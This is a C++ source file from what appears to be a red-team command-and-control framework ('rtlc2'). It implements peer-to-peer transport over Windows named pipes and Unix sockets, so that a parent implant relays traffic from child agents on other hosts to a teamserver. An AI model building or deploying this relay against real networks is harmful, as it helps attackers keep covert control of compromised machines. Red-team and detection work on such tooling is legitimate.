// P2P Transport - Agent-to-agent named pipe communication
// Parent agent relays child traffic to teamserver
#include "transport.h"
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <queue>
#include <cstring>

#ifdef RTLC2_WINDOWS
#include <windows.h>
#else
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>
#include <poll.h>
#include <cerrno>
#endif

namespace rtlc2 {
namespace transport {

class P2PTransport {
public:
    P2PTransport() : running_(false) {}
    ~P2PTransport() { Stop(); }

    // Parent mode: listen for child agent connections
    bool StartListener(const std::string& pipeName);

    // Child mode: connect to parent agent
    bool Connect(const std::string& target, const std::string& pipeName);

    // Send data through P2P channel
    bool Send(const std::vector<uint8_t>& data);

    // Receive data from P2P channel
    std::vector<uint8_t> Receive(int timeoutMs = 5000);

    // Get all received data from child agents (parent mode)
    std::vector<std::vector<uint8_t>> GetChildData();

    // Relay data from child to C2 (parent mode)
    void RelayToChildren(const std::vector<uint8_t>& data);

    void Stop();
    bool IsRunning() const { return running_.load(); }

private:
    std::atomic<bool> running_;
    std::mutex dataMutex_;
    std::queue<std::vector<uint8_t>> inboundQueue_;
    std::queue<std::vector<uint8_t>> outboundQueue_;

#ifdef RTLC2_WINDOWS
    HANDLE hPipe_ = INVALID_HANDLE_VALUE;
    std::vector<HANDLE> childPipes_;
    std::mutex childMutex_;
    std::mutex handlerMutex_;
    std::vector<std::thread> handlerThreads_;
    std::thread listenerThread_;

    void ListenerLoop(const std::string& pipeName);
    void HandleChildConnection(HANDLE hPipe);
    bool ReadPipe(HANDLE pipe, std::vector<uint8_t>& data);
    bool WritePipe(HANDLE pipe, const std::vector<uint8_t>& data);
#else
    int sockFd_ = -1;
    std::vector<int> childFds_;
    std::mutex childMutex_;
    std::mutex handlerMutex_;
    std::vector<std::thread> handlerThreads_;
    std::thread listenerThread_;
    std::string socketPath_;

    void ListenerLoop(const std::string& socketPath);
    void HandleChildConnection(int clientFd);
    bool ReadSocket(int fd, std::vector<uint8_t>& data);
    bool WriteSocket(int fd, const std::vector<uint8_t>& data);
#endif
};

// ---------------------------------------------------------------------------
// Windows Implementation
// ---------------------------------------------------------------------------
#ifdef RTLC2_WINDOWS

bool P2PTransport::StartListener(const std::string& pipeName) {
    if (running_.load()) return false;
    running_.store(true);
    listenerThread_ = std::thread(&P2PTransport::ListenerLoop, this, pipeName);
    return true;
}

bool P2PTransport::Connect(const std::string& target, const std::string& pipeName) {
    // Build UNC pipe path: \\target\pipe\pipeName
    std::string pipePath = "\\\\" + target + "\\pipe\\" + pipeName;

    // Wait for the pipe to become available (up to 5 seconds)
    std::wstring wPipePath(pipePath.begin(), pipePath.end());
    if (!WaitNamedPipeW(wPipePath.c_str(), 5000)) {
        return false;
    }

    HANDLE h = CreateFileW(wPipePath.c_str(),
                           GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING,
                           FILE_FLAG_OVERLAPPED, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Set pipe to message mode
    DWORD mode = PIPE_READMODE_BYTE;
    SetNamedPipeHandleState(h, &mode, NULL, NULL);

    hPipe_ = h;
    running_.store(true);
    return true;
}

bool P2PTransport::Send(const std::vector<uint8_t>& data) {
    if (hPipe_ == INVALID_HANDLE_VALUE) return false;
    return WritePipe(hPipe_, data);
}

std::vector<uint8_t> P2PTransport::Receive(int timeoutMs) {
    // Check inbound queue first (for parent mode data from children)
    {
        std::lock_guard<std::mutex> lock(dataMutex_);
        if (!inboundQueue_.empty()) {
            auto front = std::move(inboundQueue_.front());
            inboundQueue_.pop();
            return front;
        }
    }

    // Child mode: read directly from pipe
    if (hPipe_ != INVALID_HANDLE_VALUE) {
        OVERLAPPED ov = {};
        ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
        if (!ov.hEvent) return {};

        // Read 4-byte length prefix first
        uint8_t lenBuf[4] = {};
        DWORD bytesRead = 0;
        BOOL ok = ReadFile(hPipe_, lenBuf, 4, &bytesRead, &ov);
        if (!ok && GetLastError() == ERROR_IO_PENDING) {
            DWORD waitResult = WaitForSingleObject(ov.hEvent, (DWORD)timeoutMs);
            if (waitResult != WAIT_OBJECT_0) {
                CancelIo(hPipe_);
                CloseHandle(ov.hEvent);
                return {};
            }
            GetOverlappedResult(hPipe_, &ov, &bytesRead, FALSE);
        }

        if (bytesRead < 4) {
            CloseHandle(ov.hEvent);
            return {};
        }

        uint32_t payloadLen = (uint32_t)lenBuf[0]
                            | ((uint32_t)lenBuf[1] << 8)
                            | ((uint32_t)lenBuf[2] << 16)
                            | ((uint32_t)lenBuf[3] << 24);

        if (payloadLen == 0 || payloadLen > 16 * 1024 * 1024) {
            CloseHandle(ov.hEvent);
            return {};
        }

        std::vector<uint8_t> payload(payloadLen);
        DWORD totalRead = 0;
        while (totalRead < payloadLen) {
            ResetEvent(ov.hEvent);
            DWORD chunk = 0;
            ok = ReadFile(hPipe_, payload.data() + totalRead,
                          payloadLen - totalRead, &chunk, &ov);
            if (!ok && GetLastError() == ERROR_IO_PENDING) {
                DWORD waitResult = WaitForSingleObject(ov.hEvent, (DWORD)timeoutMs);
                if (waitResult != WAIT_OBJECT_0) {
                    CancelIo(hPipe_);
                    CloseHandle(ov.hEvent);
                    return {};
                }
                GetOverlappedResult(hPipe_, &ov, &chunk, FALSE);
            }
            if (chunk == 0) break;
            totalRead += chunk;
        }

        CloseHandle(ov.hEvent);

        if (totalRead == payloadLen) {
            return payload;
        }
        return {};
    }

    return {};
}

std::vector<std::vector<uint8_t>> P2PTransport::GetChildData() {
    std::lock_guard<std::mutex> lock(dataMutex_);
    std::vector<std::vector<uint8_t>> result;
    while (!inboundQueue_.empty()) {
        result.push_back(std::move(inboundQueue_.front()));
        inboundQueue_.pop();
    }
    return result;
}

void P2PTransport::RelayToChildren(const std::vector<uint8_t>& data) {
    std::lock_guard<std::mutex> lock(childMutex_);
    // Broadcast data to all connected child pipes
    auto it = childPipes_.begin();
    while (it != childPipes_.end()) {
        if (!WritePipe(*it, data)) {
            // Failed to write, child likely disconnected
            DisconnectNamedPipe(*it);
            CloseHandle(*it);
            it = childPipes_.erase(it);
        } else {
            ++it;
        }
    }
}

void P2PTransport::Stop() {
    running_.store(false);

    // Close child pipes (unblocks handler threads waiting on I/O)
    {
        std::lock_guard<std::mutex> lock(childMutex_);
        for (HANDLE h : childPipes_) {
            DisconnectNamedPipe(h);
            CloseHandle(h);
        }
        childPipes_.clear();
    }

    // Close main pipe (child mode)
    if (hPipe_ != INVALID_HANDLE_VALUE) {
        CloseHandle(hPipe_);
        hPipe_ = INVALID_HANDLE_VALUE;
    }

    if (listenerThread_.joinable()) {
        listenerThread_.join();
    }

    // Join all handler threads to prevent resource leaks
    {
        std::lock_guard<std::mutex> lock(handlerMutex_);
        for (auto& t : handlerThreads_) {
            if (t.joinable()) t.join();
        }
        handlerThreads_.clear();
    }
}

void P2PTransport::ListenerLoop(const std::string& pipeName) {
    std::string fullPath = "\\\\.\\pipe\\" + pipeName;
    std::wstring wPath(fullPath.begin(), fullPath.end());

    while (running_.load()) {
        // Create a new pipe instance for each connection
        HANDLE hNewPipe = CreateNamedPipeW(
            wPath.c_str(),
            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            65536,   // out buffer
            65536,   // in buffer
            0,       // default timeout
            NULL     // default security
        );

        if (hNewPipe == INVALID_HANDLE_VALUE) {
            Sleep(1000);
            continue;
        }

        // Wait for a client connection with overlapped I/O so we can check running_
        OVERLAPPED ov = {};
        ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
        if (!ov.hEvent) {
            CloseHandle(hNewPipe);
            continue;
        }

        BOOL connected = ConnectNamedPipe(hNewPipe, &ov);
        if (!connected) {
            DWORD err = GetLastError();
            if (err == ERROR_IO_PENDING) {
                // Wait with periodic checks for shutdown
                while (running_.load()) {
                    DWORD waitResult = WaitForSingleObject(ov.hEvent, 500);
                    if (waitResult == WAIT_OBJECT_0) {
                        connected = TRUE;
                        break;
                    }
                }
            } else if (err == ERROR_PIPE_CONNECTED) {
                // Client connected between CreateNamedPipe and ConnectNamedPipe
                connected = TRUE;
            }
        }

        CloseHandle(ov.hEvent);

        if (!connected || !running_.load()) {
            CloseHandle(hNewPipe);
            continue;
        }

        // Store the child pipe handle
        {
            std::lock_guard<std::mutex> lock(childMutex_);
            childPipes_.push_back(hNewPipe);
        }

        // Spawn a handler thread for this child (stored for clean join in Stop())
        std::lock_guard<std::mutex> tlock(handlerMutex_);
        handlerThreads_.emplace_back(&P2PTransport::HandleChildConnection, this, hNewPipe);
    }
}

void P2PTransport::HandleChildConnection(HANDLE hPipe) {
    while (running_.load()) {
        std::vector<uint8_t> data;
        if (ReadPipe(hPipe, data)) {
            std::lock_guard<std::mutex> lock(dataMutex_);
            inboundQueue_.push(std::move(data));
        } else {
            break; // Pipe broken or error
        }

        // Check for outbound data to send to this child
        {
            std::lock_guard<std::mutex> lock(dataMutex_);
            if (!outboundQueue_.empty()) {
                auto outData = std::move(outboundQueue_.front());
                outboundQueue_.pop();
                WritePipe(hPipe, outData);
            }
        }
    }

    // Cleanup: remove from childPipes_
    {
        std::lock_guard<std::mutex> lock(childMutex_);
        for (auto it = childPipes_.begin(); it != childPipes_.end(); ++it) {
            if (*it == hPipe) {
                childPipes_.erase(it);
                break;
            }
        }
    }

    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
}

bool P2PTransport::ReadPipe(HANDLE pipe, std::vector<uint8_t>& data) {
    // Length-prefix framing: read 4-byte LE size, then payload
    OVERLAPPED ov = {};
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!ov.hEvent) return false;

    uint8_t lenBuf[4] = {};
    DWORD bytesRead = 0;
    BOOL ok = ReadFile(pipe, lenBuf, 4, &bytesRead, &ov);
    if (!ok) {
        DWORD err = GetLastError();
        if (err == ERROR_IO_PENDING) {
            // Wait up to 5 seconds
            DWORD waitResult = WaitForSingleObject(ov.hEvent, 5000);
            if (waitResult != WAIT_OBJECT_0) {
                CancelIo(pipe);
                CloseHandle(ov.hEvent);
                return false;
            }
            GetOverlappedResult(pipe, &ov, &bytesRead, FALSE);
        } else {
            CloseHandle(ov.hEvent);
            return false;
        }
    }

    if (bytesRead < 4) {
        CloseHandle(ov.hEvent);
        return false;
    }

    uint32_t payloadLen = (uint32_t)lenBuf[0]
                        | ((uint32_t)lenBuf[1] << 8)
                        | ((uint32_t)lenBuf[2] << 16)
                        | ((uint32_t)lenBuf[3] << 24);

    // Sanity check: max 16 MB
    if (payloadLen == 0 || payloadLen > 16 * 1024 * 1024) {
        CloseHandle(ov.hEvent);
        return false;
    }

    data.resize(payloadLen);
    DWORD totalRead = 0;
    while (totalRead < payloadLen) {
        ResetEvent(ov.hEvent);
        DWORD chunk = 0;
        ok = ReadFile(pipe, data.data() + totalRead,
                      payloadLen - totalRead, &chunk, &ov);
        if (!ok) {
            DWORD err = GetLastError();
            if (err == ERROR_IO_PENDING) {
                DWORD waitResult = WaitForSingleObject(ov.hEvent, 5000);
                if (waitResult != WAIT_OBJECT_0) {
                    CancelIo(pipe);
                    CloseHandle(ov.hEvent);
                    return false;
                }
                GetOverlappedResult(pipe, &ov, &chunk, FALSE);
            } else {
                CloseHandle(ov.hEvent);
                return false;
            }
        }
        if (chunk == 0) break;
        totalRead += chunk;
    }

    CloseHandle(ov.hEvent);
    return (totalRead == payloadLen);
}

bool P2PTransport::WritePipe(HANDLE pipe, const std::vector<uint8_t>& data) {
    // Length-prefix framing: write 4-byte LE size, then payload
    uint32_t payloadLen = (uint32_t)data.size();
    uint8_t lenBuf[4] = {
        (uint8_t)(payloadLen & 0xFF),
        (uint8_t)((payloadLen >> 8) & 0xFF),
        (uint8_t)((payloadLen >> 16) & 0xFF),
        (uint8_t)((payloadLen >> 24) & 0xFF)
    };

    OVERLAPPED ov = {};
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!ov.hEvent) return false;

    // Write length prefix
    DWORD bytesWritten = 0;
    BOOL ok = WriteFile(pipe, lenBuf, 4, &bytesWritten, &ov);
    if (!ok) {
        DWORD err = GetLastError();
        if (err == ERROR_IO_PENDING) {
            WaitForSingleObject(ov.hEvent, 5000);
            GetOverlappedResult(pipe, &ov, &bytesWritten, FALSE);
        } else {
            CloseHandle(ov.hEvent);
            return false;
        }
    }
    if (bytesWritten < 4) {
        CloseHandle(ov.hEvent);
        return false;
    }

    // Write payload
    DWORD totalWritten = 0;
    while (totalWritten < payloadLen) {
        ResetEvent(ov.hEvent);
        DWORD chunk = 0;
        ok = WriteFile(pipe, data.data() + totalWritten,
                       payloadLen - totalWritten, &chunk, &ov);
        if (!ok) {
            DWORD err = GetLastError();
            if (err == ERROR_IO_PENDING) {
                WaitForSingleObject(ov.hEvent, 5000);
                GetOverlappedResult(pipe, &ov, &chunk, FALSE);
            } else {
                CloseHandle(ov.hEvent);
                return false;
            }
        }
        if (chunk == 0) break;
        totalWritten += chunk;
    }

    CloseHandle(ov.hEvent);
    return (totalWritten == payloadLen);
}

// ---------------------------------------------------------------------------
// Linux/macOS Implementation (Unix domain sockets)
// ---------------------------------------------------------------------------
#else

bool P2PTransport::StartListener(const std::string& pipeName) {
    if (running_.load()) return false;

    socketPath_ = "/tmp/rtlc2_p2p_" + pipeName + ".sock";

    // Remove stale socket file if it exists
    unlink(socketPath_.c_str());

    sockFd_ = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sockFd_ < 0) return false;

    struct sockaddr_un addr = {};
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, socketPath_.c_str(), sizeof(addr.sun_path) - 1);

    if (bind(sockFd_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sockFd_);
        sockFd_ = -1;
        return false;
    }

    if (listen(sockFd_, 8) < 0) {
        close(sockFd_);
        sockFd_ = -1;
        unlink(socketPath_.c_str());
        return false;
    }

    running_.store(true);
    listenerThread_ = std::thread(&P2PTransport::ListenerLoop, this, socketPath_);
    return true;
}

bool P2PTransport::Connect(const std::string& target, const std::string& pipeName) {
    // For Unix, target is ignored (local only); use socketPath
    std::string path = "/tmp/rtlc2_p2p_" + pipeName + ".sock";

    sockFd_ = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sockFd_ < 0) return false;

    struct sockaddr_un addr = {};
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, path.c_str(), sizeof(addr.sun_path) - 1);

    if (connect(sockFd_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sockFd_);
        sockFd_ = -1;
        return false;
    }

    running_.store(true);
    return true;
}

bool P2PTransport::Send(const std::vector<uint8_t>& data) {
    if (sockFd_ < 0) return false;
    return WriteSocket(sockFd_, data);
}

std::vector<uint8_t> P2PTransport::Receive(int timeoutMs) {
    // Check inbound queue first (for parent mode data from children)
    {
        std::lock_guard<std::mutex> lock(dataMutex_);
        if (!inboundQueue_.empty()) {
            auto front = std::move(inboundQueue_.front());
            inboundQueue_.pop();
            return front;
        }
    }

    // Child mode: read directly from socket
    if (sockFd_ >= 0) {
        struct pollfd pfd = {};
        pfd.fd = sockFd_;
        pfd.events = POLLIN;

        int ret = poll(&pfd, 1, timeoutMs);
        if (ret <= 0) return {};

        std::vector<uint8_t> data;
        if (ReadSocket(sockFd_, data)) {
            return data;
        }
    }

    return {};
}

std::vector<std::vector<uint8_t>> P2PTransport::GetChildData() {
    std::lock_guard<std::mutex> lock(dataMutex_);
    std::vector<std::vector<uint8_t>> result;
    while (!inboundQueue_.empty()) {
        result.push_back(std::move(inboundQueue_.front()));
        inboundQueue_.pop();
    }
    return result;
}

void P2PTransport::RelayToChildren(const std::vector<uint8_t>& data) {
    std::lock_guard<std::mutex> lock(childMutex_);
    auto it = childFds_.begin();
    while (it != childFds_.end()) {
        if (!WriteSocket(*it, data)) {
            close(*it);
            it = childFds_.erase(it);
        } else {
            ++it;
        }
    }
}

void P2PTransport::Stop() {
    running_.store(false);

    // Close child connections (unblocks handler threads waiting on recv)
    {
        std::lock_guard<std::mutex> lock(childMutex_);
        for (int fd : childFds_) {
            shutdown(fd, SHUT_RDWR);
            close(fd);
        }
        childFds_.clear();
    }

    // Close main socket
    if (sockFd_ >= 0) {
        close(sockFd_);
        sockFd_ = -1;
    }

    if (listenerThread_.joinable()) {
        listenerThread_.join();
    }

    // Join all handler threads to prevent resource leaks
    {
        std::lock_guard<std::mutex> lock(handlerMutex_);
        for (auto& t : handlerThreads_) {
            if (t.joinable()) t.join();
        }
        handlerThreads_.clear();
    }

    // Remove socket file
    if (!socketPath_.empty()) {
        unlink(socketPath_.c_str());
        socketPath_.clear();
    }
}

void P2PTransport::ListenerLoop(const std::string& socketPath) {
    while (running_.load()) {
        struct pollfd pfd = {};
        pfd.fd = sockFd_;
        pfd.events = POLLIN;

        int ret = poll(&pfd, 1, 500); // 500ms poll timeout for shutdown check
        if (ret <= 0) continue;

        struct sockaddr_un clientAddr = {};
        socklen_t addrLen = sizeof(clientAddr);
        int clientFd = accept(sockFd_, (struct sockaddr*)&clientAddr, &addrLen);
        if (clientFd < 0) continue;

        // Store the child fd
        {
            std::lock_guard<std::mutex> lock(childMutex_);
            childFds_.push_back(clientFd);
        }

        // Spawn handler thread (stored for clean join in Stop())
        std::lock_guard<std::mutex> tlock(handlerMutex_);
        handlerThreads_.emplace_back(&P2PTransport::HandleChildConnection, this, clientFd);
    }
}

void P2PTransport::HandleChildConnection(int clientFd) {
    while (running_.load()) {
        struct pollfd pfd = {};
        pfd.fd = clientFd;
        pfd.events = POLLIN;

        int ret = poll(&pfd, 1, 1000);
        if (ret < 0) break;
        if (ret == 0) continue;

        std::vector<uint8_t> data;
        if (ReadSocket(clientFd, data)) {
            std::lock_guard<std::mutex> lock(dataMutex_);
            inboundQueue_.push(std::move(data));
        } else {
            break; // Connection broken
        }

        // Check for outbound data to this child
        {
            std::lock_guard<std::mutex> lock(dataMutex_);
            if (!outboundQueue_.empty()) {
                auto outData = std::move(outboundQueue_.front());
                outboundQueue_.pop();
                WriteSocket(clientFd, outData);
            }
        }
    }

    // Cleanup: remove from childFds_
    {
        std::lock_guard<std::mutex> lock(childMutex_);
        for (auto it = childFds_.begin(); it != childFds_.end(); ++it) {
            if (*it == clientFd) {
                childFds_.erase(it);
                break;
            }
        }
    }

    close(clientFd);
}

bool P2PTransport::ReadSocket(int fd, std::vector<uint8_t>& data) {
    // Length-prefix framing: read 4-byte LE size, then payload
    uint8_t lenBuf[4] = {};
    size_t totalRead = 0;
    while (totalRead < 4) {
        ssize_t n = recv(fd, lenBuf + totalRead, 4 - totalRead, 0);
        if (n <= 0) return false;
        totalRead += (size_t)n;
    }

    uint32_t payloadLen = (uint32_t)lenBuf[0]
                        | ((uint32_t)lenBuf[1] << 8)
                        | ((uint32_t)lenBuf[2] << 16)
                        | ((uint32_t)lenBuf[3] << 24);

    // Sanity check: max 16 MB
    if (payloadLen == 0 || payloadLen > 16 * 1024 * 1024) return false;

    data.resize(payloadLen);
    totalRead = 0;
    while (totalRead < payloadLen) {
        ssize_t n = recv(fd, data.data() + totalRead, payloadLen - totalRead, 0);
        if (n <= 0) return false;
        totalRead += (size_t)n;
    }

    return true;
}

bool P2PTransport::WriteSocket(int fd, const std::vector<uint8_t>& data) {
    // Length-prefix framing: write 4-byte LE size, then payload
    uint32_t payloadLen = (uint32_t)data.size();
    uint8_t lenBuf[4] = {
        (uint8_t)(payloadLen & 0xFF),
        (uint8_t)((payloadLen >> 8) & 0xFF),
        (uint8_t)((payloadLen >> 16) & 0xFF),
        (uint8_t)((payloadLen >> 24) & 0xFF)
    };

    // Write length prefix
    size_t totalWritten = 0;
    while (totalWritten < 4) {
        ssize_t n = send(fd, lenBuf + totalWritten, 4 - totalWritten, 0);
        if (n <= 0) return false;
        totalWritten += (size_t)n;
    }

    // Write payload
    totalWritten = 0;
    while (totalWritten < payloadLen) {
        ssize_t n = send(fd, data.data() + totalWritten, payloadLen - totalWritten, 0);
        if (n <= 0) return false;
        totalWritten += (size_t)n;
    }

    return true;
}

#endif // RTLC2_WINDOWS

} // namespace transport
} // namespace rtlc2
